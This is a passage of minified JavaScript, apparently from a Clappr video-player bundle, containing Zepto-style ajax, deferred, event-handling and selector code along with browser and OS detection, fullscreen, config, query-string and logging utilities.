a=r.dataType,s=/\?.+=\?/.test(r.url);if(s&&(a="jsonp"),!1!==r.cache&&(e&&!0===e.cache||"script"!=a&&"jsonp"!=a)||(r.url=Oe(r.url,"_="+Date.now())),"jsonp"==a)return s||(r.url=Oe(r.url,r.jsonp?r.jsonp+"=?":!1===r.jsonp?"":"callback=?")),v.ajaxJSONP(r,n);var h,o=r.accepts[a],l={},u=function(e,t){l[e.toLowerCase()]=[e,t]},c=/^([\w-]+:)\/\//.test(r.url)?RegExp.$1:window.location.protocol,d=r.xhr(),f=d.setRequestHeader;if(n&&n.promise(d),r.crossDomain||u("X-Requested-With","XMLHttpRequest"),u("Accept",o||"*/*"),(o=r.mimeType||o)&&(o.indexOf(",")>-1&&(o=o.split(",",2)[0]),d.overrideMimeType&&d.overrideMimeType(o)),(r.contentType||!1!==r.contentType&&r.data&&"GET"!=r.type.toUpperCase())&&u("Content-Type",r.contentType||"application/x-www-form-urlencoded"),r.headers)for(g in r.headers)u(g,r.headers[g]);if(d.setRequestHeader=u,d.onreadystatechange=function(){if(4==d.readyState){d.onreadystatechange=A,clearTimeout(h);var e,t=!1;if(d.status>=200&&d.status<300||304==d.status||0==d.status&&"file:"==c){if(a=a||function we(e){return e&&(e=e.split(";",2)[0]),e&&(e==ge?"html":e==ve?"json":he.test(e)?"script":pe.test(e)&&"xml")||"text"}(r.mimeType||d.getResponseHeader("content-type")),"arraybuffer"==d.responseType||"blob"==d.responseType)e=d.response;else{e=d.responseText;try{e=function Re(e,t,r){if(r.dataFilter==A)return e;var n=r.context;return r.dataFilter.call(n,e,t)}(e,a,r),"script"==a?(0,eval)(e):"xml"==a?e=d.responseXML:"json"==a&&(e=Ae.test(e)?null:v.parseJSON(e))}catch(e){t=e}if(t)return Se(t,"parsererror",d,r,n)}Te(e,d,r,n)}else Se(d.statusText||null,d.status?"error":"abort",d,r,n)}},!1===_e(d,r))return d.abort(),Se(null,"abort",d,r,n),d;var p=!("async"in r)||r.async;if(d.open(r.type,r.url,p,r.username,r.password),r.xhrFields)for(g in r.xhrFields)d[g]=r.xhrFields[g];for(g in l)f.apply(d,l[g]);return r.timeout>0&&(h=setTimeout((function(){d.onreadystatechange=A,d.abort(),Se(null,"timeout",d,r,n)}),r.timeout)),d.send(r.data?r.data:null),d},v.get=function(){return v.ajax(Ie.apply(null,arguments))},v.post=function(){var e=Ie.apply(null,arguments);return e.type="POST",v.ajax(e)},v.getJSON=function(){var e=Ie.apply(null,arguments);return e.dataType="json",v.ajax(e)},v.fn.load=function(e,t,r){if(!this.length)return this;var a,n=this,i=e.split(/\s/),s=Ie(e,t,r),o=s.success;return i.length>1&&(s.url=i[0],a=i[1]),s.success=function(e){n.html(a?v("<div>").html(e.replace(fe,"")).find(a):e),o&&o.apply(n,arguments)},v.ajax(s),this};var De=encodeURIComponent;function Pe(r,e,n,i){var a,s=v.isArray(e),o=v.isPlainObject(e);v.each(e,(function(e,t){a=v.type(t),i&&(e=n?i:i+"["+(o||"object"==a||"array"==a?e:"")+"]"),!i&&s?r.add(t.name,t.value):"array"==a||!n&&"object"==a?Pe(r,t,n,e):r.add(e,t)}))}v.param=function(e,t){var r=[];return r.add=function(e,t){v.isFunction(t)&&(t=t()),null==t&&(t=""),this.push(De(e)+"="+De(t))},Pe(r,e,t),r.join("&").replace(/%20/g,"+")};var Ne=e,h=(Ne.Callbacks=function(n){n=Ne.extend({},n);var t,r,i,a,s,o,l=[],u=!n.once&&[],c=function(e){for(t=n.memory&&e,r=!0,o=a||0,a=0,s=l.length,i=!0;l&&o<s;++o)if(!1===l[o].apply(e[0],e[1])&&n.stopOnFalse){t=!1;break}i=!1,l&&(u?u.length&&c(u.shift()):t?l.length=0:d.disable())},d={add:function(){if(l){var e=l.length,r=function(e){Ne.each(e,(function(e,t){"function"==typeof t?n.unique&&d.has(t)||l.push(t):t&&t.length&&"string"!=typeof t&&r(t)}))};r(arguments),i?s=l.length:t&&(a=e,c(t))}return this},remove:function(){return l&&Ne.each(arguments,(function(e,t){for(var r;(r=Ne.inArray(t,l,r))>-1;)l.splice(r,1),i&&(r<=s&&--s,r<=o&&--o)})),this},has:function(e){return!(!l||!(e?Ne.inArray(e,l)>-1:l.length))},empty:function(){return s=l.length=0,this},disable:function(){return l=u=t=void 0,this},disabled:function(){return!l},lock:function(){return u=void 0,t||d.disable(),this},locked:function(){return!u},fireWith:function(e,t){return!l||r&&!u||(t=[e,(t=t||[]).slice?t.slice():t],i?u.push(t):c(t)),this},fire:function(){return d.fireWith(this,arguments)},fired:function(){return!!r}};return d},e),xe=Array.prototype.slice;function Me(e){var i=[["resolve","done",h.Callbacks({once:1,memory:1}),"resolved"],["reject","fail",h.Callbacks({once:1,memory:1}),"rejected"],["notify","progress",h.Callbacks({memory:1})]],a="pending",s={state:function(){return a},always:function(){return o.done(arguments).fail(arguments),this},then:function(){var t=arguments;return Me((function(a){h.each(i,(function(e,n){var i=h.isFunction(t[e])&&t[e];o[n[1]]((function(){var e=i&&i.apply(this,arguments);if(e&&h.isFunction(e.promise))e.promise().done(a.resolve).fail(a.reject).progress(a.notify);else{var t=this===s?a.promise():this,r=i?[e]:arguments;a[n[0]+"With"](t,r)}}))})),t=null})).promise()},promise:function(e){return null!=e?h.extend(e,s):s}},o={};return h.each(i,(function(e,t){var r=t[2],n=t[3];s[t[1]]=r.add,n&&r.add((function(){a=n}),i[1^e][2].disable,i[2][2].lock),o[t[0]]=function(){return o[t[0]+"With"](this===o?s:this,arguments),this},o[t[0]+"With"]=r.fireWith})),s.promise(o),e&&e.call(o,o),o}h.when=function(e){var s,o,l,t=xe.call(arguments),r=t.length,n=0,i=1!==r||e&&h.isFunction(e.promise)?r:0,a=1===i?e:Me(),u=function(t,r,n){return function(e){r[t]=this,n[t]=arguments.length>1?xe.call(arguments):e,n===s?a.notifyWith(r,n):--i||a.resolveWith(r,n)}};if(r>1)for(s=new Array(r),o=new Array(r),l=new Array(r);n<r;++n)t[n]&&h.isFunction(t[n].promise)?t[n].promise().done(u(n,l,t)).fail(a.reject).progress(u(n,o,s)):--i;return i||a.resolveWith(l,t),a.promise()},h.Deferred=Me;var Be,p=e,Fe=1,Ue=Array.prototype.slice,je=p.isFunction,m=function(e){return"string"==typeof e},Ve={},Ge={},Ke="onfocusin"in window,Ye={focus:"focusin",blur:"focusout"},He={mouseenter:"mouseover",mouseleave:"mouseout"};function ze(e){return e._zid||(e._zid=Fe++)}function $e(e,t,r,n){if((t=We(t)).ns)var i=function qe(e){return new RegExp("(?:^| )"+e.replace(" "," .* ?")+"(?: |$)")}(t.ns);return(Ve[ze(e)]||[]).filter((function(e){return e&&(!t.e||e.e==t.e)&&(!t.ns||i.test(e.ns))&&(!r||ze(e.fn)===ze(r))&&(!n||e.sel==n)}))}function We(e){var t=(""+e).split(".");return{e:t[0],ns:t.slice(1).sort().join(" ")}}function Xe(e,t){return e.del&&!Ke&&e.e in Ye||!!t}function Ze(e){return He[e]||Ke&&Ye[e]||e}function Qe(i,e,t,a,s,o,l){var r=ze(i),u=Ve[r]||(Ve[r]=[]);e.split(/\s/).forEach((function(e){if("ready"==e)return p(document).ready(t);var r=We(e);r.fn=t,r.sel=s,r.e in He&&(t=function(e){var t=e.relatedTarget;if(!t||t!==this&&!p.contains(this,t))return r.fn.apply(this,arguments)}),r.del=o;var n=o||t;r.proxy=function(e){if(!(e=it(e)).isImmediatePropagationStopped()){e.data=a;var t=n.apply(i,e._args==Be?[e]:[e].concat(e._args));return!1===t&&(e.preventDefault(),e.stopPropagation()),t}},r.i=u.length,u.push(r),"addEventListener"in i&&i.addEventListener(Ze(r.e),r.proxy,Xe(r,l))}))}function Je(t,e,r,n,i){var a=ze(t);(e||"").split(/\s/).forEach((function(e){$e(t,e,r,n).forEach((function(e){delete Ve[a][e.i],"removeEventListener"in t&&t.removeEventListener(Ze(e.e),e.proxy,Xe(e,i))}))}))}Ge.click=Ge.mousedown=Ge.mouseup=Ge.mousemove="MouseEvents",p.event={add:Qe,remove:Je},p.proxy=function(e,t){var r=2 in arguments&&Ue.call(arguments,2);if(je(e)){var n=function(){return e.apply(t,r?r.concat(Ue.call(arguments)):arguments)};return n._zid=ze(e),n}if(m(t))return r?(r.unshift(e[t],e),p.proxy.apply(null,r)):p.proxy(e[t],e);throw new TypeError("expected function")},p.fn.bind=function(e,t,r){return this.on(e,t,r)},p.fn.unbind=function(e,t){return this.off(e,t)},p.fn.one=function(e,t,r,n){return this.on(e,t,r,n,1)};var et=function(){return!0},tt=function(){return!1},rt=/^([A-Z]|returnValue$|layer[XY]$|webkitMovement[XY]$)/,nt={preventDefault:"isDefaultPrevented",stopImmediatePropagation:"isImmediatePropagationStopped",stopPropagation:"isPropagationStopped"};function it(n,i){return!i&&n.isDefaultPrevented||(i||(i=n),p.each(nt,(function(e,t){var r=i[e];n[e]=function(){return this[t]=et,r&&r.apply(i,arguments)},n[t]=tt})),n.timeStamp||(n.timeStamp=Date.now()),(i.defaultPrevented!==Be?i.defaultPrevented:"returnValue"in i?!1===i.returnValue:i.getPreventDefault&&i.getPreventDefault())&&(n.isDefaultPrevented=et)),n}function at(e){var t,r={originalEvent:e};for(t in e)rt.test(t)||e[t]===Be||(r[t]=e[t]);return it(r,e)}p.fn.delegate=function(e,t,r){return this.on(t,e,r)},p.fn.undelegate=function(e,t,r){return this.off(t,e,r)},p.fn.live=function(e,t){return p(document.body).delegate(this.selector,e,t),this},p.fn.die=function(e,t){return p(document.body).undelegate(this.selector,e,t),this},p.fn.on=function(t,i,r,a,s){var o,l,n=this;return t&&!m(t)?(p.each(t,(function(e,t){n.on(e,i,r,t,s)})),n):(m(i)||je(a)||!1===a||(a=r,r=i,i=Be),a!==Be&&!1!==r||(a=r,r=Be),!1===a&&(a=tt),n.each((function(e,n){s&&(o=function(e){return Je(n,e.type,a),a.apply(this,arguments)}),i&&(l=function(e){var t,r=p(e.target).closest(i,n).get(0);if(r&&r!==n)return t=p.extend(at(e),{currentTarget:r,liveFired:n}),(o||a).apply(r,[t].concat(Ue.call(arguments,1)))}),Qe(n,t,a,r,i,l||o)})))},p.fn.off=function(e,r,t){var n=this;return e&&!m(e)?(p.each(e,(function(e,t){n.off(e,r,t)})),n):(m(r)||je(t)||!1===t||(t=r,r=Be),!1===t&&(t=tt),n.each((function(){Je(this,e,t,r)})))},p.fn.trigger=function(e,t){return(e=m(e)||p.isPlainObject(e)?p.Event(e):it(e))._args=t,this.each((function(){e.type in Ye&&"function"==typeof this[e.type]?this[e.type]():"dispatchEvent"in this?this.dispatchEvent(e):p(this).triggerHandler(e,t)}))},p.fn.triggerHandler=function(r,n){var i,a;return this.each((function(e,t){(i=at(m(r)?p.Event(r):r))._args=n,i.target=t,p.each($e(t,r.type||r),(function(e,t){if(a=t.proxy(i),i.isImmediatePropagationStopped())return!1}))})),a},"focusin focusout focus blur load resize scroll unload click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select keydown keypress keyup error".split(" ").forEach((function(t){p.fn[t]=function(e){return 0 in arguments?this.bind(t,e):this.trigger(t)}})),p.Event=function(e,t){m(e)||(e=(t=e).type);var r=document.createEvent(Ge[e]||"Events"),n=!0;if(t)for(var i in t)"bubbles"==i?n=!!t[i]:r[i]=t[i];return r.initEvent(e,n,!0),it(r)};try{getComputedStyle(void 0)}catch(e){var st=getComputedStyle;window.getComputedStyle=function(e,t){try{return st(e,t)}catch(e){return null}}}var ot=e,lt=ot.zepto,ut=lt.qsa,ct=lt.matches;function dt(e){return!(!(e=ot(e)).width()&&!e.height())&&"none"!==e.css("display")}var ft=ot.expr[":"]={visible:function(){if(dt(this))return this},hidden:function(){if(!dt(this))return this},selected:function(){if(this.selected)return this},checked:function(){if(this.checked)return this},parent:function(){return this.parentNode},first:function(e){if(0===e)return this},last:function(e,t){if(e===t.length-1)return this},eq:function(e,t,r){if(e===r)return this},contains:function(e,t,r){if(ot(this).text().indexOf(r)>-1)return this},has:function(e,t,r){if(lt.qsa(this,r).length)return this}},ht=new RegExp("(.*):(\\w+)(?:\\(([^)]+)\\))?$\\s*"),pt=/^\s*>/,vt="Zepto"+ +new Date;function gt(e,t){e=e.replace(/=#\]/g,'="#"]');var r,n,i=ht.exec(e);if(i&&i[2]in ft&&(r=ft[i[2]],n=i[3],e=i[1],n)){var a=Number(n);n=isNaN(a)?n.replace(/^["']|["']$/g,""):a}return t(e,r,n)}lt.qsa=function(a,s){return gt(s,(function(e,r,n){try{var t;!e&&r?e="*":pt.test(e)&&(t=ot(a).addClass(vt),e="."+vt+" "+e);var i=ut(a,e)}catch(e){throw console.error("error performing selector: %o",s),e}finally{t&&t.removeClass(vt)}return r?lt.uniq(ot.map(i,(function(e,t){return r.call(e,t,i,n)}))):i}))},lt.matches=function(n,e){return gt(e,(function(e,t,r){return(!e||ct(n,e))&&(!t||t.call(n,null,r)===n)}))};var y=e,At=[{name:"Chromium",group:"Chrome",identifier:"Chromium/([0-9.]*)"},{name:"Chrome Mobile",group:"Chrome",identifier:"Chrome/([0-9.]*) Mobile",versionIdentifier:"Chrome/([0-9.]*)"},{name:"Chrome",group:"Chrome",identifier:"Chrome/([0-9.]*)"},{name:"Chrome for iOS",group:"Chrome",identifier:"CriOS/([0-9.]*)"},{name:"Android Browser",group:"Chrome",identifier:"CrMo/([0-9.]*)"},{name:"Firefox",group:"Firefox",identifier:"Firefox/([0-9.]*)"},{name:"Opera Mini",group:"Opera",identifier:"Opera Mini/([0-9.]*)"},{name:"Opera",group:"Opera",identifier:"Opera ([0-9.]*)"},{name:"Opera",group:"Opera",identifier:"Opera/([0-9.]*)",versionIdentifier:"Version/([0-9.]*)"},{name:"IEMobile",group:"Explorer",identifier:"IEMobile/([0-9.]*)"},{name:"Internet Explorer",group:"Explorer",identifier:"MSIE ([a-zA-Z0-9.]*)"},{name:"Internet Explorer",group:"Explorer",identifier:"Trident/([0-9.]*)",versionIdentifier:"rv:([0-9.]*)"},{name:"Spartan",group:"Spartan",identifier:"Edge/([0-9.]*)",versionIdentifier:"Edge/([0-9.]*)"},{name:"Safari",group:"Safari",identifier:"Safari/([0-9.]*)",versionIdentifier:"Version/([0-9.]*)"}],mt=[{name:"Windows 2000",group:"Windows",identifier:"Windows NT 5.0",version:"5.0"},{name:"Windows XP",group:"Windows",identifier:"Windows NT 5.1",version:"5.1"},{name:"Windows Vista",group:"Windows",identifier:"Windows NT 6.0",version:"6.0"},{name:"Windows 7",group:"Windows",identifier:"Windows NT 6.1",version:"7.0"},{name:"Windows 8",group:"Windows",identifier:"Windows NT 6.2",version:"8.0"},{name:"Windows 8.1",group:"Windows",identifier:"Windows NT 6.3",version:"8.1"},{name:"Windows 10",group:"Windows",identifier:"Windows NT 10.0",version:"10.0"},{name:"Windows Phone",group:"Windows Phone",identifier:"Windows Phone ([0-9.]*)"},{name:"Windows Phone",group:"Windows Phone",identifier:"Windows Phone OS ([0-9.]*)"},{name:"Windows",group:"Windows",identifier:"Windows"},{name:"Chrome OS",group:"Chrome OS",identifier:"CrOS"},{name:"Android",group:"Android",identifier:"Android",versionIdentifier:"Android ([a-zA-Z0-9.-]*)"},{name:"iPad",group:"iOS",identifier:"iPad",versionIdentifier:"OS ([0-9_]*)",versionSeparator:"[_|.]"},{name:"iPod",group:"iOS",identifier:"iPod",versionIdentifier:"OS ([0-9_]*)",versionSeparator:"[_|.]"},{name:"iPhone",group:"iOS",identifier:"iPhone OS",versionIdentifier:"OS ([0-9_]*)",versionSeparator:"[_|.]"},{name:"Mac OS X High Sierra",group:"Mac OS",identifier:"Mac OS X (10([_|.])13([0-9_.]*))",versionSeparator:"[_|.]"},{name:"Mac OS X Sierra",group:"Mac OS",identifier:"Mac OS X (10([_|.])12([0-9_.]*))",versionSeparator:"[_|.]"},{name:"Mac OS X El Capitan",group:"Mac OS",identifier:"Mac OS X (10([_|.])11([0-9_.]*))",versionSeparator:"[_|.]"},{name:"Mac OS X Yosemite",group:"Mac OS",identifier:"Mac OS X (10([_|.])10([0-9_.]*))",versionSeparator:"[_|.]"},{name:"Mac OS X Mavericks",group:"Mac OS",identifier:"Mac OS X (10([_|.])9([0-9_.]*))",versionSeparator:"[_|.]"},{name:"Mac OS X Mountain Lion",group:"Mac OS",identifier:"Mac OS X (10([_|.])8([0-9_.]*))",versionSeparator:"[_|.]"},{name:"Mac OS X Lion",group:"Mac OS",identifier:"Mac OS X (10([_|.])7([0-9_.]*))",versionSeparator:"[_|.]"},{name:"Mac OS X Snow Leopard",group:"Mac OS",identifier:"Mac OS X (10([_|.])6([0-9_.]*))",versionSeparator:"[_|.]"},{name:"Mac OS X Leopard",group:"Mac OS",identifier:"Mac OS X (10([_|.])5([0-9_.]*))",versionSeparator:"[_|.]"},{name:"Mac OS X Tiger",group:"Mac OS",identifier:"Mac OS X (10([_|.])4([0-9_.]*))",versionSeparator:"[_|.]"},{name:"Mac OS X Panther",group:"Mac OS",identifier:"Mac OS X (10([_|.])3([0-9_.]*))",versionSeparator:"[_|.]"},{name:"Mac OS X Jaguar",group:"Mac OS",identifier:"Mac OS X (10([_|.])2([0-9_.]*))",versionSeparator:"[_|.]"},{name:"Mac OS X Puma",group:"Mac OS",identifier:"Mac OS X (10([_|.])1([0-9_.]*))",versionSeparator:"[_|.]"},{name:"Mac OS X Cheetah",group:"Mac OS",identifier:"Mac OS X (10([_|.])0([0-9_.]*))",versionSeparator:"[_|.]"},{name:"Mac OS",group:"Mac OS",identifier:"Mac OS"},{name:"Ubuntu",group:"Linux",identifier:"Ubuntu",versionIdentifier:"Ubuntu/([0-9.]*)"},{name:"Debian",group:"Linux",identifier:"Debian"},{name:"Gentoo",group:"Linux",identifier:"Gentoo"},{name:"Linux",group:"Linux",identifier:"Linux"},{name:"BlackBerry",group:"BlackBerry",identifier:"BlackBerry"}],E={},_t=function e(t,r){var n=t.split(".",2);r.fullVersion=t,n[0]&&(r.majorVersion=parseInt(n[0])),n[1]&&(r.minorVersion=parseInt(n[1]))},St=function e(t,r,n){var i="["==r.substr(0,1)?new RegExp(r,"g"):r,a=t.split(i,2);"."!=r&&(t=t.replace(new RegExp(r,"g"),".")),n.fullVersion=t,a&&a[0]&&(n.majorVersion=parseInt(a[0])),a&&a[1]&&(n.minorVersion=parseInt(a[1]))},Ot=function e(t){var n,r=t.match(/\b(playstation 4|nx|opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i)||[];if(/trident/i.test(r[1]))return n=/\brv[ :]+(\d+)/g.exec(t)||[],{name:"IE",version:parseInt(n[1]||"")};if("Chrome"===r[1]){if(null!=(n=t.match(/\bOPR\/(\d+)/)))return{name:"Opera",version:parseInt(n[1])};if(null!=(n=t.match(/\bEdge\/(\d+)/)))return{name:"Edge",version:parseInt(n[1])}}else/android/i.test(t)&&(n=t.match(/version\/(\d+)/i))&&(r.splice(1,1,"Android WebView"),r.splice(2,1,n[1]));return{name:(r=r[2]?[r[1],r[2]]:[navigator.appName,navigator.appVersion,"-?"])[0],version:parseInt(r[1])}}(navigator.userAgent),Lt=(E.isEdge=/edge/i.test(navigator.userAgent),E.isChrome=/chrome|CriOS/i.test(navigator.userAgent)&&!E.isEdge,E.isSafari=/safari/i.test(navigator.userAgent)&&!E.isChrome&&!E.isEdge,E.isFirefox=/firefox/i.test(navigator.userAgent),E.isLegacyIE=!!window.ActiveXObject,E.isIE=E.isLegacyIE||/trident.*rv:1\d/i.test(navigator.userAgent),E.isIE11=/trident.*rv:11/i.test(navigator.userAgent),E.isChromecast=E.isChrome&&/CrKey/i.test(navigator.userAgent),E.isMobile=/Android|webOS|iPhone|iPad|iPod|BlackBerry|Windows Phone|IEMobile|Mobile Safari|Opera Mini/i.test(navigator.userAgent),E.isiOS=/iPad|iPhone|iPod/i.test(navigator.userAgent),E.isAndroid=/Android/i.test(navigator.userAgent),E.isWindowsPhone=/Windows Phone/i.test(navigator.userAgent),E.isWin8App=/MSAppHost/i.test(navigator.userAgent),E.isWiiU=/WiiU/i.test(navigator.userAgent),E.isPS4=/PlayStation 4/i.test(navigator.userAgent),E.hasLocalstorage=function e(){try{return localStorage.setItem("clappr","clappr"),localStorage.removeItem("clappr"),!0}catch(e){return!1}}(),E.hasFlash=function e(){try{return!!new ActiveXObject("ShockwaveFlash.ShockwaveFlash")}catch(e){return!(!navigator.mimeTypes||void 0===navigator.mimeTypes["application/x-shockwave-flash"]||!navigator.mimeTypes["application/x-shockwave-flash"].enabledPlugin)}}(),E.name=Ot.name,E.version=Ot.version,E.userAgent=navigator.userAgent,E.data=function e(){var i,t={},r=E.userAgent.toLowerCase(),n=se(At);try{for(n.s();!(i=n.n()).done;){var a=i.value,o=new RegExp(a.identifier.toLowerCase()).exec(r);if(null!=o&&o[1]){if(t.name=a.name,t.group=a.group,a.versionIdentifier){var u=new RegExp(a.versionIdentifier.toLowerCase()).exec(r);null!=u&&u[1]&&_t(u[1],t)}else _t(o[1],t);break}}}catch(e){n.e(e)}finally{n.f()}return t}(),E.os=function e(){var i,t={},r=E.userAgent.toLowerCase(),n=se(mt);try{for(n.s();!(i=n.n()).done;){var a=i.value,o=new RegExp(a.identifier.toLowerCase()).exec(r);if(null!=o){if(t.name=a.name,t.group=a.group,a.version)St(a.version,a.versionSeparator?a.versionSeparator:".",t);else if(o[1])St(o[1],a.versionSeparator?a.versionSeparator:".",t);else if(a.versionIdentifier){var u=new RegExp(a.versionIdentifier.toLowerCase()).exec(r);null!=u&&u[1]&&St(u[1],a.versionSeparator?a.versionSeparator:".",t)}break}}}catch(e){n.e(e)}finally{n.f()}return t}(),E.viewport=function e(){var t={};return t.width=y(window).width(),t.height=y(window).height(),t}(),E.device=function e(t){var n=/\((iP(?:hone|ad|od))?(?:[^;]*; ){0,2}([^)]+(?=\)))/.exec(t);return n&&(n[1]||n[2])||""}(E.userAgent),void 0!==window.orientation&&function e(){switch(window.orientation){case-90:case 90:E.viewport.orientation="landscape";break;default:E.viewport.orientation="portrait"}}(),{}),It=[],Dt=(window.requestAnimationFrame||window.mozRequestAnimationFrame||window.webkitRequestAnimationFrame||function(e){window.setTimeout(e,1e3/60)}).bind(window),Pt=(window.cancelAnimationFrame||window.mozCancelAnimationFrame||window.webkitCancelAnimationFrame||window.clearTimeout).bind(window);function Nt(e,t){if(t)for(var r in t){var n=Object.getOwnPropertyDescriptor(t,r);n?Object.defineProperty(e,r,n):e[r]=t[r]}return e}function xt(e,s){var t=function(e){d(a,e);var i=f(a);function a(){var e;u(this,a);for(var t=arguments.length,r=new Array(t),n=0;n<t;n++)r[n]=arguments[n];return e=i.call.apply(i,[this].concat(r)),s.initialize&&s.initialize.apply(z(e),r),e}return a}(e);return Nt(t.prototype,s),t}var Ft={fullscreenElement:function e(){return document.fullscreenElement||document.webkitFullscreenElement||document.mozFullScreenElement||document.msFullscreenElement},requestFullscreen:function e(t){if(t.requestFullscreen)return t.requestFullscreen();if(t.webkitRequestFullscreen){if("function"==typeof t.then)return t.webkitRequestFullscreen();t.webkitRequestFullscreen()}else{if(t.mozRequestFullScreen)return t.mozRequestFullScreen();if(t.msRequestFullscreen)return t.msRequestFullscreen();t.querySelector&&t.querySelector("video")&&t.querySelector("video").webkitEnterFullScreen?t.querySelector("video").webkitEnterFullScreen():t.webkitEnterFullScreen&&t.webkitEnterFullScreen()}},cancelFullscreen:function e(){var t=arguments.length>0&&void 0!==arguments[0]?arguments[0]:document;t.exitFullscreen?t.exitFullscreen():t.webkitCancelFullScreen?t.webkitCancelFullScreen():t.webkitExitFullscreen?t.webkitExitFullscreen():t.mozCancelFullScreen?t.mozCancelFullScreen():t.msExitFullscreen&&t.msExitFullscreen()},fullscreenEnabled:function e(){return!!(document.fullscreenEnabled||document.webkitFullscreenEnabled||document.mozFullScreenEnabled||document.msFullscreenEnabled)}},Bt=function(){function e(){u(this,e)}return c(e,null,[{key:"_defaultConfig",value:function e(){return{volume:{value:100,parse:parseInt}}}},{key:"_defaultValueFor",value:function e(t){try{return this._defaultConfig()[t].parse(this._defaultConfig()[t].value)}catch(e){return}}},{key:"_createKeyspace",value:function e(t){return"clappr.".concat(document.domain,".").concat(t)}},{key:"restore",value:function e(t){return E.hasLocalstorage&&localStorage[this._createKeyspace(t)]?this._defaultConfig()[t].parse(localStorage[this._createKeyspace(t)]):this._defaultValueFor(t)}},{key:"persist",value:function e(t,r){if(E.hasLocalstorage)try{return localStorage[this._createKeyspace(t)]=r,!0}catch(e){return!1}}}]),e}(),Ut=function(){function e(){u(this,e)}return c(e,null,[{key:"parse",value:function e(t){for(var r,n=/\+/g,i=/([^&=]+)=?([^&]*)/g,a=function e(t){return decodeURIComponent(t.replace(n," "))},s={};r=i.exec(t);)s[a(r[1]).toLowerCase()]=a(r[2]);return s}},{key:"params",get:function e(){var t=window.location.search.substring(1);return t!==this.query&&(this._urlParams=this.parse(t),this.query=t),this._urlParams}},{key:"hashParams",get:function e(){var t=window.location.hash.substring(1);return t!==this.hash&&(this._hashParams=this.parse(t),this.hash=t),this._hashParams}}]),e}();function jt(){var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:"t",n=0,t=Ut.params[e]||Ut.hashParams[e]||"",r=t.match(/[0-9]+[hms]+/g)||[];if(r.length>0){var i={h:3600,m:60,s:1};r.forEach((function(e){if(e){var t=e[e.length-1],r=parseInt(e.slice(0,e.length-1),10);n+=r*i[t]}}))}else t&&(n=parseInt(t,10));return n}function Vt(e){return Lt[e]||(Lt[e]=0),e+ ++Lt[e]}function Gt(e){return e-parseFloat(e)+1>=0}function Kt(){var e=document.getElementsByTagName("script");return e.length?e[e.length-1].src:""}function Yt(){return window.navigator&&window.navigator.language}function Wt(n,e){var t=(e=Object.assign({inline:!1,muted:!1,timeout:250,type:"video",source:le.mp4,element:null},e)).element?e.element:document.createElement(e.type);t.muted=e.muted,!0===e.muted&&t.setAttribute("muted","muted"),!0===e.inline&&t.setAttribute("playsinline","playsinline"),t.src=e.source;var r=t.play(),i=setTimeout((function(){a(!1,new Error("Timeout ".concat(e.timeout," ms has been reached")))}),e.timeout),a=function e(t){var r=arguments.length>1&&void 0!==arguments[1]?arguments[1]:null;clearTimeout(i),n(t,r)};void 0!==r?r.then((function(){return a(!0)})).catch((function(e){return a(!1,e)})):a(!0)}var qt=function(){function e(){u(this,e)}return c(e,null,[{key:"configure",value:function e(t){this.options=y.extend(!0,this.options,t)}},{key:"create",value:function e(t){return this.options.recycleVideo&&"video"===t&&It.length>0?It.shift():document.createElement(t)}},{key:"garbage",value:function e(t){this.options.recycleVideo&&"VIDEO"===t.tagName.toUpperCase()&&(y(t).children().remove(),Object.values(t.attributes).forEach((function(e){return t.removeAttribute(e.name)})),It.push(t))}}]),e}(),Xt=(qt.options={recycleVideo:!1},function(){function t(){var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:500;u(this,t),this.delay=e,this.lastTime=0}return c(t,[{key:"handle",value:function e(t,r){var n=!(arguments.length>2&&void 0!==arguments[2])||arguments[2],i=(new Date).getTime(),a=i-this.lastTime;a<this.delay&&a>0&&(r(),n&&t.preventDefault()),this.lastTime=i}}]),t}()),t={Config:Bt,Fullscreen:Ft,QueryString:Ut,DomRecycler:qt,assign:Nt,extend:xt,formatTime:function Mt(e,t){if(!isFinite(e))return"--:--";e*=1e3;var r=(e=parseInt(e/1e3))%60,n=(e=parseInt(e/60))%60,i=(e=parseInt(e/60))%24,a=parseInt(e/24),s="";return a&&a>0&&(s+=a+":",i<1&&(s+="00:")),(i&&i>0||t)&&(s+=("0"+i).slice(-2)+":"),s+=("0"+n).slice(-2)+":",(s+=("0"+r).slice(-2)).trim()},seekStringToSeconds:jt,uniqueId:Vt,currentScriptUrl:Kt,isNumber:Gt,requestAnimationFrame:Dt,cancelAnimationFrame:Pt,getBrowserLanguage:Yt,now:function Ht(){return window.performance&&window.performance.now?performance.now():Date.now()},removeArrayItem:function zt(e,t){var r=e.indexOf(t);r>=0&&e.splice(r,1)},listContainsIgnoreCase:function $t(t,e){return void 0!==t&&void 0!==e&&void 0!==e.find((function(e){return t.toLowerCase()===e.toLowerCase()}))},canAutoPlayMedia:Wt,Media:le,DoubleEventHandler:Xt},Zt="font-weight: bold; font-size: 13px;",er="color: #ff8000;"+Zt,tr="color: #ff0000;"+Zt,or=["color: #0000ff;"+Zt,"color: #006600;"+Zt,er,tr,tr],lr=["debug","info","warn","error","disabled"],b=function(){function r(){var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:1,t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:3;u(this,r),this.EXCLUDE_LIST=["timeupdate","playback:timeupdate","playback:progress","container:hover","container:timeupdate","container:progress"],this.level=e,this.previousLevel=this.level,this.offLevel=t}return c(r,[{key:"level",get:function e(){return this._level},set:function e(t){this._level=t}}]),c(r,[{key:"debug",value:function e(t){this.log(t,0,Array.prototype.slice.call(arguments,1))}},{key:"info",value:function e(t){this.log(t,1,Array.prototype.slice.call(arguments,1))}},{key:"warn",value:function e(t){this.log(t,2,Array.prototype.slice.call(arguments,1))}},{key:"error",value:function e(t){this.log(t,3,Array.prototype.slice.call(arguments,1))}},{key:"onOff",value:function e(){this.level===this.offLevel?this.level=this.previousLevel:(this.previousLevel=this.level,this.level=this.offLevel),window.console&&window.console.log&&window.console.log("%c[Clappr.Log] set log level to "+lr[this.level],er)}},{key:"log",value:function e(t,r,n){if(!(this.EXCLUDE_LIST.indexOf(n[0])>=0||r<this.level)){n||(n=t,t=null);var i=or[r],a="";t&&(a="["+t+"]"),window.console&&window.console.log&&window.console.log.apply(console,["%c["+lr[r]+"]"+a,i].concat(n))}}}]),r}(),ur=(b.LEVEL_DEBUG=0,b.LEVEL_INFO=1,b.LEVEL_WARN=2,b.LEVEL_ERROR=3,b.getInstance=function(){return void 